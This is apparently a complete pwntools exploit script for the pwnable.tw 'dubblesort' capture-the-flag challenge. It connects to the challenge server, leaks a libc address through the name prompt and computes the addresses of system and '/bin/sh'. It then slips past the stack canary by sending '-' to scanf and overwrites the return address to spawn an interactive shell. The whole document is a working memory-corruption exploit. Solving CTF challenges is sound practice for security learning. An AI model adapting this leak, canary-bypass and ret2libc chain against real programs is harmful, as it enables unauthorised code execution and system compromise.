#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("dubblesort_patched")
libc = elf.libc

local = False 
if local:
    p = process("./dubblesort_patched")
    gdb.attach(p,'''
    b*main+111
    c
    b*main+310''')
else:
    p = remote('chall.pwnable.tw', 10101)

elf = context.binary = ELF('./dubblesort_patched', checksec=False)

payload = b"a"*28
p.sendlineafter(b"What your name :", payload)
p.recvuntil(payload)

libc_base = int.from_bytes(p.recv(4),"little") - 1769482
system = libc_base + 0x3a940
binsh = libc_base + 0x158e8b

leak = int.from_bytes(p.recv(4),"little") + 1322
main = leak + 360


print("[+]Libc_base:    ", hex(libc_base))
print("[+]System:         ", hex(system))
print("[+]Bin_sh:         ", hex(binsh))

p.sendlineafter(b"How many numbers do you what to sort :", b"35")

def send_value(value):
    p.sendlineafter(b" number :", str(value))

for i in range(24):
    send_value(str(i))

p.sendlineafter(b" number :", b"-")
for i in range(8):
    p.sendlineafter(b" number :", str(system))
p.sendlineafter(b" number :", str(system+1))
p.sendlineafter(b" number :", str(binsh))

p.interactive()